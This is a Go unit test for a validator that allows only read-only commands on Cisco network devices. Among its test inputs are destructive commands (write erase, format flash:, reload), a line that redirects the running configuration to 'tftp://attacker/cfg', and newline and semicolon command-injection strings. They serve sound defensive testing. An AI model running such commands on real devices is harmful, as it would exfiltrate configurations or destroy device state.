// Copyright © 2026 Cisco Systems Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0

package diagnostic

import (
	"errors"
	"testing"
)

func TestValidateCommands(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cmds    []string
		wantErr bool
	}{
		// allowlisted heads
		{"show-running-config", []string{"show running-config"}, false},
		{"show-version", []string{"show version"}, false},
		{"show-ip-route", []string{"show ip route 0.0.0.0"}, false},
		{"ping", []string{"ping 8.8.8.8"}, false},
		{"traceroute", []string{"traceroute 8.8.8.8"}, false},
		{"dir-flash", []string{"dir flash:"}, false},
		{"terminal-length", []string{"terminal length 0"}, false},
		{"more-flash-config", []string{"more flash:running-config"}, false},
		{"multiple-allowlisted", []string{"show version", "show ip int brief"}, false},

		// non-allowlisted head — must reject
		{"configure-terminal", []string{"configure terminal"}, true},
		{"config-t", []string{"config t"}, true},
		{"reload", []string{"reload"}, true},
		{"reload-in", []string{"reload in 5"}, true},
		{"clear-counters", []string{"clear counters"}, true},
		{"clear-arp", []string{"clear arp-cache"}, true},
		{"copy-running-startup", []string{"copy running-config startup-config"}, true},
		{"erase-startup", []string{"erase startup-config"}, true},
		{"write-erase", []string{"write erase"}, true},
		{"write-memory", []string{"write memory"}, true},
		{"format-flash", []string{"format flash:"}, true},
		{"delete-flash", []string{"delete flash:foo.bin"}, true},
		{"empty-command", []string{""}, true},
		{"whitespace-only", []string{"   "}, true},

		// pipe / redirect bypass attempts on otherwise-allowed heads
		{"show-redirect-tftp", []string{"show running-config | redirect tftp://attacker/cfg"}, true},
		{"show-redirect-no-space", []string{"show running-config |redirect tftp://attacker/cfg"}, true},
		{"show-tee-flash", []string{"show running-config | tee flash:cfg"}, true},
		{"show-append", []string{"show version | append flash:log.txt"}, true},

		// CLI-injection vectors
		{"newline-injection", []string{"show version\nreload"}, true},
		{"semicolon-injection", []string{"show version; reload"}, true},
		{"shell-pipe", []string{"show version | sh"}, true},

		// mixed batch with one bad command — fail-fast
		{"mixed-batch", []string{"show version", "configure terminal"}, true},

		// case-insensitive head match
		{"uppercase-show", []string{"SHOW VERSION"}, false},

		// head-prefix match without space — must reject
		{"showbogus-head-prefix", []string{"showbogus hack"}, true},

		// Adversarial-review Finding #3: per-head subcommand
		// restrictions. `monitor capture <name> ... buffer ...` is the
		// only read-only monitor form; state-changing variants must be
		// rejected even though the head matches the old allowlist.
		{"monitor-capture-buffer", []string{"monitor capture cvkcap buffer brief"}, false},
		{"monitor-capture-show-buffer", []string{"monitor capture cvkcap buffer dump"}, false},
		{"monitor-capture-start", []string{"monitor capture cvkcap start"}, true},
		{"monitor-capture-stop", []string{"monitor capture cvkcap stop"}, true},
		{"monitor-capture-clear", []string{"monitor capture cvkcap clear"}, true},
		{"monitor-capture-export", []string{"monitor capture cvkcap export flash:cap.pcap"}, true},
		{"monitor-event", []string{"monitor event-trace foo"}, true},
		{"terminal-monitor", []string{"terminal monitor"}, true},
		{"terminal-no-monitor", []string{"terminal no monitor"}, false},
		{"terminal-width", []string{"terminal width 132"}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateCommands(tc.cmds)
			gotErr := err != nil
			if gotErr != tc.wantErr {
				t.Fatalf("got err=%v, wantErr=%v (cmds=%v)", err, tc.wantErr, tc.cmds)
			}
			if gotErr && !errors.Is(err, ErrCommandDisallowed) {
				t.Errorf("expected error to wrap ErrCommandDisallowed; got %v", err)
			}
		})
	}
}
